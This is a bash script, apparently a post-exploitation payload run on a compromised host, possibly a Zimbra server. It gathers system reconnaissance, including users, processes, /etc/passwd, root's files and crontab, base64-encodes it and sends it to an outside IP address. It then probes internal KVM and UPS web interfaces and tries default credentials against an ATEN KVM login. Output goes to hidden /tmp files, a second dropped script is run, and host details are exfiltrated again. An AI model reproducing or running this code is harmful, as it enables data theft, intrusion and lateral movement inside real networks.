#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
C=/opt/zimbra/common/bin/curl
[ -x "$C" ] || C=curl
O=/tmp/.KVM.txt
: > "$O"
echo "== .99 /ui ==" >> "$O"
$C -ksS -m 12 "https://10.61.10.99/ui" -D - >> "$O" 2>&1 | head -40
$C -ksS -m 12 "https://10.61.10.99/ui/" >> "$O" 2>&1 | grep -aiE "title|server|powered|login|ups|apc|eaton|3cx|synology" | head -10
echo "== .80 ATEN model/login ==" >> "$O"
$C -ksS -m 12 "https://10.61.10.80/cgi-bin/login.cgi" -D - >> "$O" 2>&1 | head -12
# aten kn1000/kl1508 style: POST name=btoa pwd=btoa
B64A=$(printf 'administrator' | base64); B64P=$(printf 'password' | base64)
$C -ksS -m 12 -c /tmp/.atc -X POST "https://10.61.10.80/cgi-bin/login.cgi" --data "name=$B64A&pwd=$B64P" -D - >> "$O" 2>&1 | head -16
B64A2=$(printf 'admin' | base64); B64P2=$(printf 'admin' | base64)
$C -ksS -m 12 -c /tmp/.atc -X POST "https://10.61.10.80/cgi-bin/login.cgi" --data "name=$B64A2&pwd=$B64P2" -D - >> "$O" 2>&1 | head -16
# info page sometimes open
$C -ksS -m 12 "https://10.61.10.80/html/info.html" >> "$O" 2>&1 | grep -aiE "model|firmware|version" | head -5
echo KVM_DONE >> "$O"
bash /tmp/.ex.sh "$O" kvm
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


